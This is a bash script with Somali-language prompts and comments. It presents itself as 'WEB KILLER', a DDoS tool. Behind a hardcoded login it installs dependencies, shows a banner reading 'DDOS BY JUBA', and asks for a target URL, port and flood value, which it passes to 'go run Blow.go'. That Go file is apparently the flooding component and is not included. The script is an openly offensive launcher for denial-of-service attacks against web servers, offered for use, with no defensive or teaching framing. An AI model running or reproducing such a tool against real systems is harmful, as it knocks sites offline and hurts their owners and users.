#!/bin/bash

# Frome Login
read -p "Username: " username
read -s -p "Password: " password

# Kadib Gali Passwordka Saxda ah Mudane/Marwo
if [ "$username" == "Nabad iyo" ] && [ "$password" == "Nolol" ]; then
    # Hadda Waad Saxday Username ka Iyo passwordka waxaadna Horay ugali kartaa Toolka.
    clear
    echo "welcome to WEB KILLER TOOL"
    sleep 2
    # Qayb Kale Oo Kamid ah Loginka.
    e="echo -e "
    r='\033[0;31m'
    h='\033[0;32m'
    k='\033[0;33m'
    b='\033[0;34m'
    bl="\033[1;34m"
    purple='\033[0;35m'
    cyan='\033[0;36m'
    p='\033[0;37m'
    bgr='\033[41m'
    bgh='\033[42m'
    bgk='\033[43m'
    bgb='\033[44m'
    bgpurple='\033[45m'
    bgc='\033[46m'
    bgp='\033[47m'
    clear
    play -q robot.mp3 &>/dev/null &
    $e  "        $r installing package...!"
    apt install golang sox -y
    pip install requests
    pip install bs4
    pip install instaloader
    pip install rich
    pip install distro
    clear
    play -q robot2.mp3 &>/dev/null &
    $e "        $h Installing Package Succes"
    sleep 3
    while true; do
        clear
        $e $h"
██╗    ██╗███████╗██████╗     ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                         
                                                                         "
        echo
        echo
        play -q hello.mp3 &>/dev/null
        play -q robot2.mp3 &>/dev/null &
        $e $bl"        ╔════════════════════════════╗"
        $e $bl"        ║ $r TooL Name$cyan :$h WEB KILLER $bl             ║"
        $e $bl"        ╚════════════════════════════╝"
        $e $bl"        ║                            ║"
        $e $bl"╔═════════════════════════════════════════════╗"
        $e $bl"║ $k 1.$h BILAAW        $k 0.$h KABAX $bl                ║"
        $e $bl"╚═════════════════════════════════════════════╝"
        echo
        $e $bl "┌[$r DDOS BY $bl]-($h JUBA $bl)"
        read -p " └>  " pil
        $e $cyan
        if [ $pil = "1" ]; then
            read -p "URL   ===> : " ip
            play -q klik.mp3 &>/dev/null &
            read -p "PORT  ===> : " port
            play -q klik.mp3 &>/dev/null &
            read -p "FLOOD ===> : " FLOOD
            play -q klik.mp3 &>/dev/null &
            $e $k
            go run Blow.go -url $ip $port $FLOOD
        elif [ $pil = "0" ]; then
            $e $bgh "HADDA WAAD KA BAXDAY TOOLKA"
            exit 1
        else
            $e $m " Mudane ! Sheyga Aad Galisay waa Qalad. Isku day inaad galiso 1 ama 0 !"
            sleep 2
            read -p " GALI SI AAD U ISTICMAASHO."
        fi
    done
else
    echo "FADLAN ISKA SAX USERNAME KA IYO PASSWORD KA."
    exit 1
fi
